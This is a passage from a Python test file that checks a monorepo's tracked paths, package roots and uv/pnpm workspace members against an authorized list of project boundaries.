def test_m0_acceptance_topology_rejects_unvalidated_future_acceptance_surfaces(
    acceptance_file: str,
) -> None:
    simulated_files = (
        AUTHORIZED_BOOT026_ACCEPTANCE_TESTS | AUTHORIZED_M0_ACCEPTANCE_TESTS | {acceptance_file}
    )

    assert _unauthorized_acceptance_tests(simulated_files) == {acceptance_file}


def test_later_task_security_provider_runtime_surfaces_match_authorized_current_boundary() -> None:
    existing = [path for path in LATER_TASK_PATHS if (REPO_ROOT / path).exists()]
    unexpected_integration_tests = _unauthorized_integration_tests(_tracked_integration_tests())
    unexpected_acceptance_tests = _unauthorized_acceptance_tests(_tracked_acceptance_tests())
    unexpected_top_level = _tracked_top_level_paths() - ALLOWED_TOP_LEVEL_PATHS
    unexpected_github_paths = _unauthorized_github_paths(_tracked_github_paths())
    unexpected_runtime_files = _unauthorized_runtime_source_files(_tracked_runtime_source_files())
    unexpected_contracts_source_files = _unauthorized_contracts_source_files(
        _tracked_contracts_source_files()
    )
    unexpected_typescript_contracts_source_files = _unauthorized_typescript_contracts_source_files(
        _tracked_typescript_contracts_source_files()
    )
    unexpected_api_source_files = _unauthorized_api_source_files(_tracked_api_source_files())
    unexpected_api_test_files = _unauthorized_api_test_files(_tracked_api_test_files())
    unexpected_web_source_files = _unauthorized_web_source_files(_tracked_web_source_files())
    unexpected_apps = _tracked_app_roots() - ALLOWED_APP_ROOTS
    unexpected_packages = _tracked_package_roots() - ALLOWED_PACKAGE_ROOTS
    unexpected_m0_package_roots = _tracked_package_roots() & M0_DEFERRED_PACKAGE_ROOTS
    root_pyproject = tomllib.loads((REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8"))
    python_workspace_members = frozenset(root_pyproject["tool"]["uv"]["workspace"]["members"])
    node_workspaces = _pnpm_workspace_packages(REPO_ROOT / "pnpm-workspace.yaml")

    _assert_no_security_failure(
        not existing,
        f"deferred provider/API/runtime path(s) unexpectedly exist: {existing}",
    )
    _assert_no_security_failure(
        not unexpected_integration_tests,
        "unexpected integration test path(s) outside authorized BOOT/M0 integration tests: "
        f"{sorted(unexpected_integration_tests)}",
    )
    _assert_no_security_failure(
        not unexpected_acceptance_tests,
        "unexpected acceptance test path(s) outside authorized BOOT/M0 acceptance tests: "
        f"{sorted(unexpected_acceptance_tests)}",
    )
    _assert_no_security_failure(
        not unexpected_top_level,
        f"unexpected tracked top-level path(s): {sorted(unexpected_top_level)}",
    )
    _assert_no_security_failure(
        not unexpected_github_paths,
        f"unexpected tracked .github path(s): {sorted(unexpected_github_paths)}",
    )
    _assert_no_security_failure(
        not unexpected_runtime_files,
        f"unexpected tracked curios_runtime source file(s): {sorted(unexpected_runtime_files)}",
    )
    _assert_no_security_failure(
        not unexpected_contracts_source_files,
        "unexpected tracked curios_contracts source file(s) before TASK-M1-002: "
        f"{sorted(unexpected_contracts_source_files)}",
    )
    _assert_no_security_failure(
        not unexpected_typescript_contracts_source_files,
        "unexpected tracked TypeScript contracts source file(s) before TASK-M1-002: "
        f"{sorted(unexpected_typescript_contracts_source_files)}",
    )
    _assert_no_security_failure(
        not unexpected_api_source_files,
        f"unexpected tracked apps/api source file(s): {sorted(unexpected_api_source_files)}",
    )
    _assert_no_security_failure(
        not unexpected_api_test_files,
        f"unexpected tracked apps/api test file(s): {sorted(unexpected_api_test_files)}",
    )
    _assert_no_security_failure(
        not unexpected_web_source_files,
        f"unexpected tracked apps/web source file(s): {sorted(unexpected_web_source_files)}",
    )
    _assert_no_security_failure(
        not unexpected_apps,
        f"unexpected tracked application root(s): {sorted(unexpected_apps)}",
    )
    _assert_no_security_failure(
        not unexpected_packages,
        f"unexpected tracked package root(s): {sorted(unexpected_packages)}",
    )
    _assert_no_security_failure(
        not unexpected_m0_package_roots,
        "M0 package root(s) appeared before their specific task authorization: "
        f"{sorted(unexpected_m0_package_roots)}",
    )
    _assert_no_security_failure(
        python_workspace_members
        == {
            "apps/api",
            "packages/python/curios_capability",
            "packages/python/curios_cognitive",
            "packages/python/curios_config",
            "packages/python/curios_contracts",
            "packages/python/curios_core",
            "packages/python/curios_dag",
            "packages/python/curios_ollama",
            "packages/python/curios_observability",
            "packages/python/curios_persistence",
            "packages/python/curios_policy",
            "packages/python/curios_postgres_provider",
            "packages/python/curios_runtime",
        },
        f"unexpected Python workspace member(s): {sorted(python_workspace_members)}",
    )
    _assert_no_security_failure(
        node_workspaces == {"apps/*", "packages/typescript/*"},
        f"unexpected Node workspace member(s): {sorted(node_workspaces)}",
    )
